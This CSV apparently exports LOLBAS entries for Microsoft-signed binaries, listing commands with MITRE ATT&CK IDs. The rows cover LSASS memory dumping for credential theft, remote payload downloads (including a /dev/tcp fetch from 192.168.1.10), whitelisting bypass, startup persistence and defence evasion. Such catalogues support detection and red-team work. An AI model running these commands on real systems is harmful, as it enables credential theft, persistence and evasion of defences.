Command,Name,Description,Usecase,Category,MitreID
cdb.exe -c C:\debug-script.txt calc,Cdb.exe,Execute arbitrary commands and binaries using a debugging script (see Resources section for a sample file).,Run commands under a trusted Microsoft signed binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Cdb.yml
Excel.exe http://192.168.1.10/TeamsAddinLoader.dll,Excel.exe,Downloads payload from remote server,It will download a remote payload and place it in the cache folder,Download,T1105,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Excel.yml
Vsjitdebugger.exe calc.exe,vsjitdebugger.exe,Executes calc.exe as a subprocess of Vsjitdebugger.exe.,Execution of local PE file as a subprocess of Vsjitdebugger.exe.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Vsjitdebugger.yml
adplus.exe -hang -pn lsass.exe -o c:\users\mr.d0x\output\folder -quiet,adplus.exe,Creates a memory dump of the lsass process,Create memory dump and parse it offline,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml
adplus.exe -c config-adplus.xml,adplus.exe,Execute arbitrary commands using adplus config file (see Resources section for a sample file).,Run commands under a trusted Microsoft signed binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml
adplus.exe -c config-adplus.xml,adplus.exe,Dump process memory using adplus config file (see Resources section for a sample file).,Run commands under a trusted Microsoft signed binary,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml
adplus.exe -crash -o "C:\temp\" -sc calc.exe,adplus.exe,Execute arbitrary commands and binaries from the context of adplus. Note that providing an output directory via '-o' is required.,Run commands under a trusted Microsoft signed binary,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Adplus.yml
devinit.exe run -t msi-install -i https://example.com/out.msi,Devinit.exe,Downloads an MSI file to C:\Windows\Installer and then installs it.,Executes code from a (remote) MSI file.,Execute,T1218.007,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Devinit.yml
Update.exe --download [url to package],Update.exe,The above binary will go to url and look for RELEASES file and download the nuget package.,Download binary,Download,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --update=[url to package],Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --update=[url to package],Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --update=\\remoteserver\payloadFolder,Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package via SAMBA.,Download and execute binary,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --update=\\remoteserver\payloadFolder,Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package via SAMBA.,Download and execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --updateRollback=[url to package],Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --updateRollback=[url to package],Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package.,Download and execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --processStart payload.exe --process-start-args "whatever args",Update.exe,Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.,Application Whitelisting Bypass,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --updateRollback=\\remoteserver\payloadFolder,Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package via SAMBA.,Download and execute binary,AWL Bypass,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --updateRollback=\\remoteserver\payloadFolder,Update.exe,The above binary will go to url and look for RELEASES file. download and install the nuget package via SAMBA.,Download and execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --processStart payload.exe --process-start-args "whatever args",Update.exe,Copy your payload into %userprofile%\AppData\Local\Microsoft\Teams\current\. Then run the command. Update.exe will execute the file you copied.,Execute binary,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --createShortcut=payload.exe -l=Startup,Update.exe,Copy your payload into "%localappdata%\Microsoft\Teams\current\". Then run the command. Update.exe will create a payload.exe shortcut in "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup". Then payload will run on every login of the user who runs it.,Execute binary,Execute,T1547,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
Update.exe --removeShortcut=payload.exe -l=Startup,Update.exe,Run the command to remove the shortcut created in the "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup" directory you created with the LolBinExecution "--createShortcut" described on this page.,Execute binary,Execute,T1070,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Update.yml
dump64.exe <pid> out.dmp,Dump64.exe,Creates a memory dump of the LSASS process.,Create memory dump and parse it offline to retrieve credentials.,Dump,T1003.001,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Dump64.yml
AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\Windows\SysWOW64\WindowsPowerShell\v1.0" 0 1,AgentExecutor.exe,Spawns powershell.exe and executes a provided powershell script with ExecutionPolicy Bypass argument,Execute unsigned powershell scripts,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml
AgentExecutor.exe -powershell "c:\temp\malicious.ps1" "c:\temp\test.log" "c:\temp\test1.log" "c:\temp\test2.log" 60000 "C:\temp\" 0 1,AgentExecutor.exe,If we place a binary named powershell.exe in the path c:\temp. agentexecutor.exe will execute it successfully,Execute a provided EXE,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Agentexecutor.yml
DefaultPack.EXE /C:"process.exe args",DefaultPack.EXE,Use DefaultPack.EXE to execute arbitrary binaries. with added argument support.,Can be used to execute stagers. binaries. and other malicious commands.,Execute,T1218,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/DefaultPack.yml
wsl.exe -e /mnt/c/Windows/System32/calc.exe,Wsl.exe,Executes calc.exe from wsl.exe,Performs execution of specified file. can be used to execute arbitrary Linux commands.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml
wsl.exe -u root -e cat /etc/shadow,Wsl.exe,Cats /etc/shadow file as root,Performs execution of arbitrary Linux commands as root without need for password.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml
wsl.exe --exec bash -c 'cat file',Wsl.exe,Cats /etc/shadow file as root,Performs execution of arbitrary Linux commands.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml
wsl.exe --system calc.exe,Wsl.exe,Execute the command as root,Performs execution of arbitrary Linux commands as root without need for password.,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml
wsl.exe --exec bash -c 'cat < /dev/tcp/192.168.1.10/54 > binary',Wsl.exe,Downloads file from 192.168.1.10,Download file,Download,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Wsl.yml
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Tracker.exe,Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.,Injection of locally stored DLL file into target process.,Execute,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml
Tracker.exe /d .\calc.dll /c C:\Windows\write.exe,Tracker.exe,Use tracker.exe to proxy execution of an arbitrary DLL into another process. Since tracker.exe is also signed it can be used to bypass application whitelisting solutions.,Injection of locally stored DLL file into target process.,AWL Bypass,T1127,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/Tracker.yml
OpenConsole.exe calc,OpenConsole.exe,Execute calc with OpenConsole.exe as parent process,Use OpenConsole.exe as a proxy binary to evade defensive counter-measures,Execute,T1202,https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OtherMSBinaries/OpenConsole.yml
